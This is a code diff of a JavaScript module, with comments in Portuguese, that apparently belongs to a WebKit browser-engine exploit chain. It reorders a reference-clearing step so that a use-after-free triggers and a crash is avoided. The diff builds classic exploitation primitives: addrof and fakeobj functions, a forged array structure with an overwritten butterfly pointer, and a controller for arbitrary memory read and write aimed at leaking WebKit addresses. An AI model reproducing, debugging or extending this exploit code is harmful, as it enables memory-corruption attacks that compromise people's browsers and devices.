@@ -1,10 +1,9 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v10 - Final UAF Proof)
+// js/script3/testArrayBufferVictimCrash.mjs (v11 - Final Logic Fix)
 // =======================================================================================
 // ESTRATÉGIA FINAL:
 // 1. Primitiva de L/E robusta com TypedArray mantida.
-// 2. CORREÇÃO FINAL: Adicionada a limpeza da referência no `victim_array` após o uso
-//    do `addrof`, garantindo que o objeto de sonda seja elegível para o Garbage Collector.
-//    Isso deve finalmente revelar o UAF.
+// 2. CORREÇÃO FINAL: Ajustada a ordem da limpeza do `victim_array` para depois da
+//    criação do `master_arr_controller`, corrigindo o TypeError.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -106,10 +105,10 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         const master_arr_victim_butterfly_addr_val = fakeobj(master_arr_victim_addr)[1];
         fake_arr_struct.Butterfly_Ptr = master_arr_victim_butterfly_addr_val;
 
+        // <-- MUDANÇA: A ordem da limpeza foi corrigida
         const fake_arr_struct_addr = addrof(victim_array[0] = fake_arr_struct);
-        victim_array[0] = null; // Limpa a referência do addrof
-
-        const master_arr_controller = fakeobj(fake_arr_struct_addr);
+        const master_arr_controller = fakeobj(fake_arr_struct_addr); // Cria o controller PRIMEIRO
+        victim_array[0] = null; // Limpa a referência DEPOIS
         
         const set_master_arr_addr = (addr_to_point_to) => {
             master_arr_controller[2] = addr_to_point_to;
@@ -163,7 +162,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             const PROBE_MARKER_VALUE = new AdvancedInt64(0x12345678, 0xABCDABCD);
             const probe_object = { marker: 0, a: 0, b: 0, c: 0 };
             
-            // <-- MUDANÇA: Limpando a referência do `victim_array` imediatamente após o uso.
             const probe_object_addr = addrof(victim_array[0] = probe_object);
             victim_array[0] = null; // ESTA É A CORREÇÃO CRÍTICA!
 
